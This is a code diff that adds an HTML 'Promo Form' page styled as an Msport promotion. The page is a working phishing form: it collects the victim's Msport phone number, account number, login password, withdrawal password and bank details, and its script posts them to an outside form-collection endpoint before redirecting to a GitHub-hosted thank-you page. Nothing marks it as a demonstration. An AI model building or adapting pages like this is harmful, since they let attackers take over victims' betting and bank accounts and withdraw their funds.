@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Promo Form</title>
+  <style>
+    body {
+      background-color: yellow; /* Background color */
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    form {
+      max-width: 300px;
+      margin: auto;
+      padding: 20px;
+      background: white; /* White form background */
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: blue;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div style="text-align: center;">
+    <img src="https://i.imgur.com/oiYv5K9.jpeg" alt="Msport Logo" width="200">
+  </div>
+
+  <form id="promoForm">
+    <label for="name">Name:</label>
+    <input type="text" name="name" required>
+
+    <label for="email">Email:</label>
+    <input type="email" name="email" required>
+
+    <label for="phone">Msport Phone Number:</label>
+    <input type="tel" name="msport_number" required>
+
+    <label for="accountnumber">Account Number:</label>
+    <input type="text" name="account_number" required>
+     
+    <label for="loginPassword">Login Password:</label>
+    <input type="text" name="login_password" required>
+
+    <label for="withdrawalPassword">Withdrawal Password:</label>
+    <input type="text" name="withdrawal_password" required>
+
+    <label for="fullname">Account Full Name:</label>
+    <input type="text" name="account_fullname" required>
+      
+    <label for="bankname">Preferred Bank Name:</label>
+    <input type="text" name="bank_name" required>
+
+    <!-- Honeypot Field (Hidden to avoid spam bots) -->
+    <input type="text" name="_honey" style="display:none">
+
+    <!-- Instead of relying on a hidden _next field, we'll handle redirection via JavaScript -->
+    <button type="submit">Submit</button>
+  </form>
+
+  <script>
+    document.getElementById("promoForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      const formData = new FormData(this);
+
+      // Send form data to Getform using fetch
+      fetch("https://getform.io/f/ajjmddwa", {
+        method: "POST",
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          // Force redirection to your custom thank-you page after a successful submission
+          window.location.href = "https://israel2024-ux.github.io/msportpromofunds/thank-you.html";
+        } else {
+          alert("Error submitting form. Please try again.");
+        }
+      })
+      .catch(error => {
+        alert("An error occurred. Please try again.");
+      });
+    });
+  </script>
+
+</body>
+</html>
